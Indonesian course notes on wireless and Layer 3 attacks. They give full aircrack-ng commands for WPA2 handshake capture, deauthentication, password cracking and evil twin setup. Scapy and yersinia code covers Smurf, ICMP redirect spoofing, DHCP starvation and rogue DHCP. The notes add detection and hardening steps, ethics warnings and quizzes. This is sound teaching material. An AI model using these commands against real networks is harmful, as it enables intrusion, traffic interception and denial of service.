# Pertemuan 4–5 — Wireless (WPA2) & L3 Security (IP/ICMP)

Catatan ini ditulis dari materi dosen di `Network-Security-Course-Bank/Pertemuan4.md` (judul asli: "Pertemuan 4: Wireless Security - WPA2 Cracking & Deauth Attack"). Isi: evolusi protokol Wi-Fi, cara kerja WPA2 4-way handshake, monitor mode, capture handshake, deauthentication attack, cracking pakai aircrack-ng, sampai evil twin.

## Pengantar Keamanan Wi-Fi

### Evolusi protokol keamanan Wi-Fi

| Era | Protokol | Catatan |
|---|---|---|
| 1999 | **WEP** | Rentan, kunci statis, CRC32 lemah |
| 2004 | **WPA** | TKIP, masih ada celah (migrasi dari WEP) |
| 2006 | **WPA2** | AES-CCMP, standar saat ini, rentan terhadap handshake crack |
| 2018 | **WPA3** | SAE, anti offline dictionary attack, perlindungan lebih kuat |

### Kenapa WPA2 masih rentan?

WPA2 pakai **Pre-Shared Key (PSK)** yang rentan terhadap **offline dictionary attack**. Saat client terhubung, terjadi **4-way handshake** yang bisa ditangkap dan di-crack offline.

Kerentalanan utama (dari materi):
- **Handshake bisa ditangkap** — proses autentikasi diekspos di udara.
- **Password lemah** — dictionary attack masih efektif.
- **Deauth tidak terenkripsi** — management frame nggak dilindungi.

### Aircrack-ng Suite

| Tool | Fungsi |
|---|---|
| **airmon-ng** | Mengaktifkan/menonaktifkan monitor mode |
| **airodump-ng** | Sniffing packet & scanning network |
| **aireplay-ng** | Packet injection (deauth, fake auth) |
| **aircrack-ng** | Cracking WEP/WPA2 key |
| **airbase-ng** | Fake access point / evil twin |
| **airdecap-ng** | Decrypt captured packets dengan kunci yang diketahui |

## Cara Kerja WPA2 Handshake

### 4-Way Handshake

Sebelum handshake, kedua pihak sudah tahu PSK. Lalu:

1. **AP → Client**: `ANonce` (nomor acak dari AP)
2. **Client → AP**: `SNonce` (nomor acak dari client) + `MIC` (Message Integrity Code)
3. Kedua pihak menghitung **PTK (Pairwise Transient Key)** dari PSK + ANonce + SNonce + MAC address
4. **AP → Client**: `GTK` (Group Temporal Key) + MIC (dienkripsi dengan PTK)
5. **Client → AP**: Acknowledge + MIC
6. Handshake selesai — data dienkripsi dengan PTK

### Informasi yang didapat saat handshake tertangkap

- **BSSID** (MAC address AP)
- **ESSID** (nama jaringan)
- **ANonce** dan **SNonce**
- **MIC** — inilah yang di-crack

### Prinsip cracking

```
PSK = PBKDF2(Passphrase, ESSID, 4096, 256)

# Yang kita punya dari handshake: ESSID, ANonce, SNonce, MAC, MIC
# Cracking = coba passphrase → hitung PSK → hitung PTK → hitung MIC
#            → bandingkan dengan MIC asli
```

> [!IMPORTANT]
> Inti serangan WPA2: handshake yang tertangkap nggak bisa "didekripsi". Yang kamu lakukan adalah **menebak password offline** — tiap tebakan dihitung ulang jadi MIC dan dibandingkan. Karena itu password lemah = kalah, password kuat & panjang = secara praktis nggak bisa di-crack.

## Docker Hands-On: Setup Lab Wireless dengan Container

Keuntungan Docker untuk lab wireless (tanpa hardware WiFi fisik, tanpa VM berat):

| Aspek | VM Tradisional | Docker Container |
|---|---|---|
| Booting time | 2–5 menit | 5–10 detik |
| Memory | 2–4 GB per VM | 200–500 MB per container |
| Tools setup | Manual, lama | Instant dengan docker-compose |
| Network simulation | VirtualBox Bridge | Docker network Bridge/Host |
| Reproducibility | Sulit | Docker image konsisten |

Setup dasar:

```bash
docker --version && docker-compose --version

mkdir -p wifi-lab/{captures,wordlists,configs,scripts,burp-state}
cp docker-compose-p4.yml wifi-lab/
cd wifi-lab
docker-compose -f docker-compose-p4.yml up -d
docker-compose -f docker-compose-p4.yml ps
docker-compose exec kali-wireless-lab bash
aircrack-ng --version
```

Bikin wordlist untuk cracking:

```bash
cat > wordlists/custom-wordlist.txt << EOF
password123
wifipassword
router12345
qwertyui
12345678
admin123
EOF
```

> [!NOTE]
> Di materi, container yang disiapkan: `kali-wireless-lab` (kali-rolling), `wifi-ap-target` (ubuntu:22.04), dan `burp-wireless` (burp-suite-community). Ada juga trik simulasi AP pakai `dnsmasq` di dalam container untuk DHCP simulation.

## Hands-On: Setup Lab Wireless (Fisik/VM)

Kebutuhan hardware:
- **WiFi adapter dengan monitor mode support** — chipset Atheros, Ralink, atau Realtek yang support injection.
- **Kali Linux** (langsung atau VM dengan USB passthrough).
- **Target**: WiFi pribadi sendiri.

```bash
sudo su
apt update
apt install -y aircrack-ng macchanger xterm
iwconfig          # cek interface wireless (mis. wlan0)
```

## Hands-On: Monitor Mode & Network Scanning

**Managed Mode** = mode normal buat koneksi internet.
**Monitor Mode** = mode listening buat menangkap semua packet di udara.

```bash
airmon-ng check kill                 # matikan NetworkManager & wpa_supplicant
airmon-ng start wlan0                # bikin interface wlan0mon
iwconfig                             # verifikasi mode:Monitor

airodump-ng wlan0mon                 # scan semua jaringan
```

Output `airodump-ng` (kolom penting):

| Kolom | Arti |
|---|---|
| **BSSID** | MAC address Access Point |
| **PWR** | Kekuatan sinyal (makin mendekati 0 makin kuat) |
| **CH** | Channel |
| **ENC** | Enkripsi (WPA2, WPA3, dll) |
| **ESSID** | Nama jaringan |

Fokus ke target tertentu:

```bash
airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w capture wlan0mon
# --bssid: filter AP | -c: channel | -w: prefix file output (.cap, .csv, .log)
```

Biarkan terminal ini jalan (digunakan buat menangkap handshake).

## Hands-On: Capturing WPA2 Handshake

Tanda handshake berhasil tertangkap — lihat pojok kanan atas `airodump-ng`:

```
CH  6 ][ Elapsed: 2 mins ][ 2025-02-25 14:30 ][ WPA handshake: 00:11:22:33:44:55
```

Menunggu handshake natural (pasif) bisa **lama sekali** kalau nggak ada client baru connect — ini kelemahannya. Karena itu dipakai deauth.

Verifikasi handshake (opsional) pakai Wireshark:

```bash
apt install -y wireshark
wireshark capture-01.cap &
# filter: eapol  → kalau muncul 4 paket EAPOL, handshake lengkap
```

## Hands-On: Deauthentication Attack

**Deauth attack** mengirim paket palsu untuk memutuskan client dari AP. Setelah terputus, client otomatis mencoba reconnect, dan di saat itulah handshake tertangkap.

Identifikasi client yang terhubung (bagian bawah output airodump):

```
BSSID              STATION            PWR   Rate    Lost  Frames  Probe
00:11:22:33:44:55  AA:BB:CC:DD:EE:FF  -35   54-54   0     120
```

**STATION** = MAC address client yang terhubung.

```bash
# Deauth ke semua client (broadcast)
aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon

# Deauth ke client spesifik (lebih efektif)
aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

Parameter:
- `--deauth` atau `-0` → mode deauthentication
- `5` → jumlah paket deauth (0 = terus-menerus)
- `-a` → BSSID AP target
- `-c` → MAC client spesifik

Troubleshooting deauth:

| Masalah | Solusi |
|---|---|
| Terlalu jauh dari client | Mendekat ke target |
| Client ignore broadcast | Pakai `-c` untuk target spesifik |
| Beda standar (b/g/n/ac) | Pastikan adapter support standar client |
| Tidak ada ACK | Cek dengan tcpdump apakah packet sampai |

> [!WARN]
> Deauth attack berhasil karena **management frame 802.11 nggak terenkripsi** — inilah kenapa WPA3 memperkenalkan **Protected Management Frames (PMF)**. Catatan tambahan (bukan dari materi dosen): istilah PMF nggak disebut eksplisit di materi, tapi inilah standar industri yang menutup celah ini.

## Hands-On: Cracking Handshake dengan Aircrack-ng

```bash
ls -la /usr/share/wordlists/rockyou.txt     # wordlist klasik
sudo gunzip /usr/share/wordlists/rockyou.txt.gz   # kalau masih .gz

ls -la capture*                              # hasil: capture-01.cap, .csv, .log
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

Kalau berhasil:

```
                           KEY FOUND! [ rumasaya123 ]
      Master Key     : 12 34 56 78 ...
      Transient Key  : 12 34 56 78 ...
      EAPOL HMAC     : 12 34 56 78 ...
```

Mempercepat cracking dengan filter wordlist:

```bash
grep -E '^.{8}$' /usr/share/wordlists/rockyou.txt > 8char.txt
aircrack-ng capture-01.cap -w 8char.txt
```

Alternatif GPU dengan Hashcat:

```bash
apt install -y hashcat hashcat-utils
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
```

## Hands-On: Evil Twin Attack dengan Airbase-ng

**Evil Twin** = AP palsu dengan ESSID yang sama dengan target asli. Korban connect ke AP palsu, penyerang tangkap kredensialnya.

```bash
airmon-ng start wlan0
airbase-ng -e "RumahSaya" -c 6 wlan0mon     # -e: ESSID | -c: channel

# Konfigurasi DHCP untuk evil twin
ifconfig at0 up
ifconfig at0 192.168.1.1 netmask 255.255.255.0
apt install -y isc-dhcp-server
# tulis /etc/dhcp/dhcpd.conf dengan range 192.168.1.100-200
dhcpd -cf /etc/dhcp/dhcpd.conf at0

# Sniff traffic korban
tcpdump -i at0 -n -A
```

Kombinasi deauth + evil twin: client diputus dari AP asli, lalu (mungkin) connect ke fake AP.

## Deteksi dan Pencegahan

Deteksi deauth attack:

```bash
tcpdump -i wlan0mon -n -e -v 'type mgt subtype deauth'
# Akan terlihat banyak deauth dalam waktu singkat
```

Deteksi fake AP — cari ESSID sama dengan BSSID berbeda:

```bash
airodump-ng --essid "RumahSaya" wlan0mon
```

Mitigasi (dari materi):

| Mitigasi | Keterangan |
|---|---|
| **Gunakan WPA3** | SAE melindungi dari offline dictionary attack |
| **Password kuat** | Minimal 12 karakter, campuran huruf/angka/simbol |
| **Disable WPS** | WPS mudah di-brute force |
| **MAC filtering** | Whitelist perangkat (nggak 100% aman) |
| **Monitor jaringan** | Deteksi anomali seperti deauth flooding |
| **Update firmware** | AP dengan firmware terbaru punya patch keamanan |

Tips pengguna rumahan: password kuat ≥12 karakter, aktifkan WPA3, update firmware router, matikan WPS, pakai VPN, waspada saat connect (perhatikan sertifikat HTTPS).

## Ringkasan Perintah Penting

| Fungsi | Perintah |
|---|---|
| Cek interface | `iwconfig` |
| Kill interfering processes | `airmon-ng check kill` |
| Aktifkan monitor mode | `airmon-ng start wlan0` |
| Scan jaringan | `airodump-ng wlan0mon` |
| Fokus ke target | `airodump-ng --bssid <BSSID> -c <CH> -w <file> wlan0mon` |
| Deauth attack | `aireplay-ng --deauth <count> -a <BSSID> wlan0mon` |
| Deauth client spesifik | `aireplay-ng --deauth <count> -a <BSSID> -c <clientMAC> wlan0mon` |
| Crack handshake | `aircrack-ng <file.cap> -w <wordlist>` |
| Bikin fake AP | `airbase-ng -e <ESSID> -c <CH> wlan0mon` |
| Matikan monitor mode | `airmon-ng stop wlan0mon` |
| Restart network | `systemctl start NetworkManager` |

> [!WARN]
> Disclaimer tegas dari materi: semua praktik HANYA untuk jaringan yang kamu miliki atau punya izin tertulis. Mengakses jaringan orang lain tanpa izin **ILEGAL** di hampir semua negara — bisa tuntutan pidana, denda, bahkan penjara.

```quiz
Q: Urutan evolusi protokol keamanan Wi-Fi yang benar adalah...
+ WEP → WPA → WPA2 → WPA3
- WPA → WEP → WPA3 → WPA2
- WEP → WPA2 → WPA → WPA3
> WEP (1999) → WPA/TKIP (2004) → WPA2/AES-CCMP (2006) → WPA3/SAE (2018).

Q: Kerentanan utama WPA2 yang dimanfaatkan pada serangan ini adalah...
+ Handshake bisa ditangkap lalu di-crack offline (dictionary attack)
- AES-CCMP bisa didekripsi secara real-time
- WPA2 tidak memakai enkripsi sama sekali
> Data WPA2 tetap terenkripsi AES; yang diserang adalah PSK lemah via offline dictionary attack terhadap handshake.

Q: Protokol yang memperkenalkan SAE dan tahan terhadap offline dictionary attack adalah...
+ WPA3
- WPA
- WEP
> WPA3 pakai SAE (Simultaneous Authentication of Equals).

Q: Info yang didapat penyerang dari 4-way handshake WPA2 adalah...
+ BSSID, ESSID, ANonce, SNonce, dan MIC
- Password Wi-Fi dalam bentuk plaintext
- Private key server
> Handshake memberi parameter penghitungan MIC; password tetap harus ditebak offline.

Q: Yang di-crack oleh aircrack-ng dari handshake adalah...
+ MIC (Message Integrity Code)
- Nama file capture
- Sertifikat TLS server
> Penyerang menebak passphrase → hitung PSK → PTK → MIC, lalu bandingkan dengan MIC asli.

Q: Perintah untuk mengaktifkan monitor mode di interface wlan0 adalah...
+ airmon-ng start wlan0
- airodump-ng wlan0mon
- aireplay-ng --deauth 5 wlan0mon
> airmon-ng start bikin interface monitor (wlan0mon); airodump buat scan, aireplay buat inject.

Q: Kenapa deauthentication attack bisa berhasil?
+ Management frame 802.11 tidak terenkripsi sehingga bisa dipalsukan
- Karena password Wi-Fi bocor lewat handshake
- Karena client selalu menolak reconnect
> Deauth frame termasuk management frame; tanpa proteksi, penyerang bisa memalsukan paket "putus" dari AP.

Q: Tanda di airodump-ng bahwa handshake sudah tertangkap adalah...
+ Muncul teks "WPA handshake: <BSSID>" di pojok kanan atas
- Muncul pesan "KEY FOUND!"
- Halaman berubah jadi merah
> "WPA handshake" = handshake tertangkap. "KEY FOUND!" muncul di aircrack-ng setelah cracking berhasil.

Q: Evil Twin adalah...
+ AP palsu dengan ESSID sama dengan AP asli
- Client palsu yang menyerang AP
- Router yang memblokir semua client
> Evil twin meniru nama jaringan asli supaya korban connect ke AP penyerang.

Q: Alasan materi menganjurkan mematikan WPS di router adalah...
+ WPS mudah di-brute force
- WPS membuat Wi-Fi lebih lambat
- WPS memblokir WPA3
> WPS punya mekanisme PIN yang rawan brute force, jadi harus dimatikan.

Q: Mitigasi yang membuat handshake WPA3 tahan offline dictionary attack adalah...
+ SAE (Simultaneous Authentication of Equals)
- TKIP
- WPS PIN
> SAE menggantikan mekanisme PSK berbasis handshake yang rentan, sehingga cracking offline tidak praktis.
```

---

## Bagian 2 — Pertemuan 5 — L3 Security: IP/ICMP Attacks


Catatan ini aku tulis dari materi dosen di `Network-Security-Course-Bank/Pertemuan5.md` (judul asli: "Pertemuan 5: L3 Security - IP/ICMP Attacks") plus `Pertemuan5/INDEX.md` (lab index). Isi: kerentanan Layer 3, protokol ICMP, Smurf attack, DHCP starvation, ICMP redirect, ping of death, sampai hardening sysctl.

## Pengantar Layer 3 Security

Fungsi utama Layer 3 (Network Layer):

1. **Pengalamatan logis (IP addressing)** — identifikasi host di jaringan.
2. **Routing** — menentukan jalur terbaik ke tujuan.
3. **Fragmentation** — memecah paket besar agar sesuai MTU.
4. **Error handling** — ICMP buat pelaporan error.

Kerentanan umum Layer 3 (dari materi):

| Jenis Serangan | Target | Dampak |
|---|---|---|
| **Smurf Attack** | ICMP Amplification | DoS, bandwidth saturation |
| **Ping of Death** | IP Fragmentation | Crash sistem, buffer overflow |
| **ICMP Redirect** | Routing table | Man-in-the-Middle |
| **DHCP Starvation** | DHCP Pool | DoS, rogue DHCP server |
| **IP Spoofing** | IP Address | Bypass authentication |
| **Fragmentation Attack** | IP Fragmentation | IDS evasion, resource exhaustion |

## ICMP Protocol & Kerentanannya

**ICMP (Internet Control Message Protocol)** = protokol tambahan untuk IP yang dipakai buat:
- Melaporkan error (destination unreachable, time exceeded)
- Diagnostic (ping, traceroute)
- Control messages (redirect, source quench)

Tipe ICMP penting:

| Type | Code | Deskripsi | Penggunaan |
|---|---|---|---|
| 0 | 0 | Echo Reply | Ping response |
| 8 | 0 | Echo Request | Ping request |
| 3 | 0–15 | Destination Unreachable | Error routing |
| 5 | 0–3 | Redirect | Ubah routing |
| 11 | 0–1 | Time Exceeded | Traceroute |

Format paket ICMP (header):

```
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                              Data                             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Kerentanan ICMP:

1. **No authentication** — ICMP mudah dipalsukan.
2. **Amplification** — response bisa lebih besar dari request.
3. **Broadcast** — ICMP ke broadcast address berdampak luas.
4. **Tunneling** — data bisa disembunyikan di ICMP payload.

> [!NOTE]
> ICMP berfungsi sebagai "control plane" IP. Karena nggak ada autentikasi sama sekali, ICMP bisa dipakai buat kedua hal: troubleshooting *dan* serangan. Type 8 (request) dan 5 (redirect) adalah bintang utamanya.

## Docker Hands-On: Setup Lab L3 Attacks

Topologi lab — network `192.168.50.0/24`:

| Container | IP | Peran |
|---|---|---|
| `attacker-l3` (kali-rolling) | 192.168.50.2 | Penyerang (Scapy, hping3, tcpdump) |
| `target-l3` (ubuntu:22.04) | 192.168.50.3 | Target yang rentan |
| `dhcp-server` (ubuntu:22.04) | 192.168.50.4 | DHCP server (config rentan) |
| `monitor-l3` (kali-rolling) | 192.168.50.5 | Monitoring/tcpdump |

```bash
mkdir -p l3-lab && cd l3-lab
docker-compose -f docker-compose-p5.yml up -d
docker-compose ps

docker-compose exec target-l3 ip addr show
docker-compose exec attacker-l3 ping -c 4 192.168.50.3
docker-compose exec monitor-l3 tcpdump -i eth0 -n icmp
```

Cleanup:

```bash
docker-compose down
docker-compose down -v     # sekaligus hapus volume
```

## Hands-On: Setup Lab dengan Scapy

```bash
docker-compose exec kali-attacker bash
apt update
apt install -y python3-scapy python3-pip tcpdump yersinia

python3 -c "from scapy.all import *; print('Scapy terinstall!')"

mkdir -p /root/l3-attacks && cd /root/l3-attacks
```

Dasar bikin paket dengan Scapy:

```python
from scapy.all import *
ip = IP(src="192.168.1.100", dst="192.168.1.10")
icmp = ICMP(type=8, code=0)   # Echo Request
packet = ip/icmp
print(packet.summary())
packet.show()
```

## Hands-On: Analisis Paket dengan Scapy

Sniffer sederhana yang mengenali ICMP/TCP/UDP:

```python
from scapy.all import *
def packet_callback(packet):
    if IP in packet:
        src, dst = packet[IP].src, packet[IP].dst
        proto = packet[IP].proto
        if proto == 1 and ICMP in packet:
            print(f"ICMP: {src} -> {dst} Type:{packet[ICMP].type}")
        elif proto == 6 and TCP in packet:
            print(f"TCP: {src}:{packet[TCP].sport} -> {dst}:{packet[TCP].dport}")
        elif proto == 17 and UDP in packet:
            print(f"UDP: {src}:{packet[UDP].sport} -> {dst}:{packet[UDP].dport}")

sniff(iface="eth0", prn=packet_callback, filter="ip", count=10)
```

Analisis paket ICMP custom (Echo Request, payload besar, Timestamp Request) pakai `sr1()` buat kirim + tunggu respons, dan hitung **Round Trip Time** dari `response.time - p.sent_time`.

### IP Fragmentation Analysis

```python
large_data = b"X" * 3000
packet = IP(dst="192.168.1.10")/ICMP()/large_data
print(f"Ukuran paket asli: {len(packet)} bytes")
fragments = fragment(packet, fragsize=1480)
for i, frag in enumerate(fragments):
    print(f"Fragment {i+1}: Size {len(frag)}, MF {frag[IP].flags == 1}, Offset {frag[IP].frag * 8} bytes")
```

> [!IMPORTANT]
> Fragment offset dihitung dalam satuan 8 byte (`frag * 8`), dan MTU standar 1500 byte. Dua detail ini yang dimanfaatkan buat serangan Ping of Death dan fragmentation attack.

## Hands-On: Smurf Attack

**Smurf Attack** = serangan DoS yang memanfaatkan ICMP broadcast amplification. Konsepnya:

1. Attacker kirim ICMP Echo Request ke **broadcast address** dengan **source IP dipalsukan** (IP korban).
2. Semua host di jaringan menerima request dan **membalas ke korban**.
3. Korban kewalahan oleh banyaknya response — amplification factor = jumlah host.

```python
from scapy.all import *
target_ip = "192.168.1.10"          # IP korban (source yang dipalsukan)
broadcast_ip = "192.168.1.255"       # broadcast address
for i in range(5):
    packet = IP(src=target_ip, dst=broadcast_ip)/ICMP(type=8)/f"Smurf-{i}".encode()
    send(packet, iface="eth0", verbose=0)
    time.sleep(0.5)
```

Monitoring dari target: `tcpdump -i eth0 -n icmp` → akan terlihat banyak ICMP Echo Reply dari berbagai host padahal target nggak pernah mengirim Echo Request.

## Hands-On: DHCP Starvation dengan Yersinia

**DHCP Starvation** = penyerang membanjiri DHCP server dengan request buat menghabiskan semua IP yang tersedia.

```bash
yersinia -I                        # mode teks (F2 pilih DHCP, x lihat attacks)
yersinia dhcp -attack 1 -interface eth0 -number 100    # starvation, 100 request
```

Konsekuensinya:
1. **Denial of Service** — client legitimate nggak bisa dapat IP.
2. **Rogue DHCP Server** — setelah pool habis, attacker bisa pasang DHCP palsu.
3. **Man-in-the-Middle** — rogue DHCP bisa atur gateway dan DNS.

```bash
# Rogue DHCP server setelah starvation sukses
yersinia dhcp -attack 2 -interface eth0 \
  -network 192.168.1.0/24 -dns 8.8.8.8 -gateway 192.168.1.100
```

Simulasi versi Scapy: generate MAC acak tiap request, kirim DHCP Discover dari `0.0.0.0:68` ke `255.255.255.255:67` dengan `BOOTP(chaddr=mac_acak)` + `DHCP(options=[("message-type","discover"), "end"])`.

Monitoring di server: `dhcpdump -i eth0` atau cek `/var/lib/dhcp/dhcpd.leases`.

## Hands-On: ICMP Redirect Attack

**ICMP Redirect** normalnya dipakai router buat ngasih tahu host bahwa ada route yang lebih baik. Disalahgunakan → MITM.

```python
# Attacker menyamar sebagai gateway asli dan mengirim ICMP Redirect
original_packet = IP(src=target, dst="8.8.8.8")/ICMP(type=8)
redirect_packet = (
    IP(src=gateway, dst=target) /
    ICMP(type=5, code=1, gw=new_gateway) /   # code 1 = redirect for host
    original_packet                            # paket asli yang menginspirasi redirect
)
send(redirect_packet, verbose=0)
```

Monitoring di target:

```bash
route -n ; ip route show
tcpdump -i eth0 -n icmp and icmp[0] == 5
```

## Hands-On: Ping of Death

**Ping of Death** = mengirim ICMP packet yang melebihi ukuran maksimum IP (**65535 bytes**) dengan memanfaatkan fragmentasi. Target crash saat reassembly karena buffer overflow.

```
Paket ICMP normal: 64 bytes
Paket Ping of Death: >65535 bytes setelah reassembly

Cara:
1. Kirim fragment pertama dengan offset 0, ukuran besar
2. Kirim fragment terakhir dengan offset yang menyebabkan total >65535
3. Target crash saat reassembly (buffer overflow)
```

```bash
ping -s 65507 192.168.1.10     # maksimum di Linux modern
```

> [!NOTE]
> Sistem modern sudah dipatch terhadap Ping of Death — materi sendiri mencatat ini di komentar script-nya. Jadi di lab sekarang, ping of death lebih jadi latihan konsep fragmentation daripada serangan yang benar-benar mematikan target.

## Deteksi dan Pencegahan

### Pencegahan di router/gateway

```bash
# Disable IP directed broadcast (proteksi smurf)
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts

# Rate limiting ICMP
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Filter ICMP redirect
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv4/conf/all/secure_redirects
```

DHCP Snooping di switch managed (Cisco):

```
ip dhcp snooping
ip dhcp snooping vlan 1
interface eth0/1
 ip dhcp snooping trust     # port ke DHCP server
```

### Hardening di host (`/etc/sysctl.conf`)

```
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
net.ipv4.icmp_ratelimit = 100
net.ipv4.icmp_ratemask = 6168
net.ipv4.conf.all.rp_filter = 1        # reverse path filtering (anti IP spoofing)
net.ipv4.conf.all.log_martians = 1
net.ipv4.tcp_syncookies = 1
```

> [!TIP]
> `rp_filter = 1` itu yang menangkis IP spoofing: paket yang datang dari interface "salah" (nggak sesuai rute balik) langsung dibuang. Ini kunci buat bertahan dari Smurf dan banyak serangan berbasis spoofed source.

## Ringkasan Perintah Penting

| Fungsi | Perintah |
|---|---|
| Scapy basics | `python3 -c "from scapy.all import *"` |
| Sniffing | `sniff(iface="eth0", count=10)` |
| Kirim paket | `send(IP(dst="target")/ICMP())` |
| Yersinia DHCP | `yersinia dhcp -attack 1 -interface eth0` |
| Smurf attack | `python3 smurf_simulator.py` |
| Disable redirect | `echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects` |
| DHCP monitoring | `dhcpdump -i eth0` |
| ICMP rate limit | `iptables -A INPUT -p icmp -m limit --limit 1/s -j ACCEPT` |
| Disable broadcast | `sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1` |

> [!WARN]
> Ethical reminder dari materi: semua teknik ini hanya untuk jaringan sendiri atau dengan izin tertulis. Serangan DoS, DHCP starvation, dan MITM adalah tindakan kriminal di banyak negara. Kalau nemu kerentanan di jaringan publik, laporkan ke administrator — jangan dieksploitasi.

```quiz
Q: Smurf attack memanfaatkan tipe ICMP apa dan ke alamat apa?
+ Echo Request (type 8) ke broadcast address dengan source IP korban
- Echo Reply (type 0) langsung ke korban
- Redirect (type 5) ke gateway
> Attacker mengirim Echo Request palsu ke broadcast, semua host membalas ke IP korban → amplifikasi.

Q: Amplification factor pada Smurf attack kira-kira sebesar...
+ Jumlah host yang membalas di jaringan broadcast tersebut
- Jumlah paket yang dikirim attacker saja
- Kecepatan koneksi korban
> Satu request → banyak reply = faktor amplifikasi sebanding jumlah host yang menjawab.

Q: DHCP Starvation menyerang...
+ Pool alamat IP pada DHCP server
- Tabel ARP korban
- Sertifikat TLS
> Penyerang menghabiskan seluruh pool IP dengan request ber-MAC palsu sehingga client sah tidak kebagian IP.

Q: Bahaya lanjutan setelah DHCP pool habis adalah...
+ Rogue DHCP server yang bisa mengatur gateway dan DNS korban (MITM)
- Korban otomatis dapat IP statis
- ARP table server terhapus
> Setelah pool habis, penyerang pasang DHCP palsu dan mengarahkan gateway/DNS ke dirinya.

Q: Ping of Death bekerja dengan cara...
+ Mengirim paket ICMP yang setelah reassembly melebihi 65535 byte
- Mengirim ping 64 byte berulang cepat
- Menghapus file hosts di target
> Batas maksimum paket IP adalah 65535 byte; melewatinya lewat fragmentasi bikin buffer overflow di sistem rentan.

Q: Data ICMP Type 5 Code 1 dipakai untuk...
+ Redirect for host
- Echo request
- Time exceeded
> Type 5 = redirect; Code 1 = redirect khusus host → dipakai mengubah routing korban (MITM).

Q: sysctl yang paling langsung mencegah Smurf attack adalah...
+ net.ipv4.icmp_echo_ignore_broadcasts = 1
- net.ipv4.tcp_syncookies = 1
- net.ipv4.conf.all.log_martians = 1
> Mengabaikan ping ke broadcast bikin host tidak mau membalas, sehingga amplifikasi gagal.

Q: Konfigurasi `net.ipv4.conf.all.accept_redirects = 0` bertujuan...
+ Menolak ICMP redirect sehingga route tidak bisa dibelokkan penyerang
- Mempercepat routing
- Mengaktifkan fragmentasi
> Ini mematikan penerimaan redirect untuk menghindari MITM via ICMP redirect.

Q: Yersinia pada materi dipakai untuk serangan di layer...
+ Layer 2/3 (DHCP, HSRP, STP, CDP, dll)
- Layer 7 saja
- Layer 4 saja
> Materi menyebut Yersinia sebagai framework pengujian kerentanan protokol Layer 2 termasuk DHCP.

Q: Route problem yang dikirim router adalah fungsi normal ICMP Redirect, yang membedakan serangan adalah...
+ Redirect dikirim dengan source gateway palsu untuk membelokkan traffic ke penyerang
- Redirect dikirim oleh client ke router
- Redirect selalu berisi payload terenkripsi
> ICMP redirect asli itu sah; penyerang memalsukan pengirimnya seolah gateway asli agar korban mengubah rute ke penyerang.
```
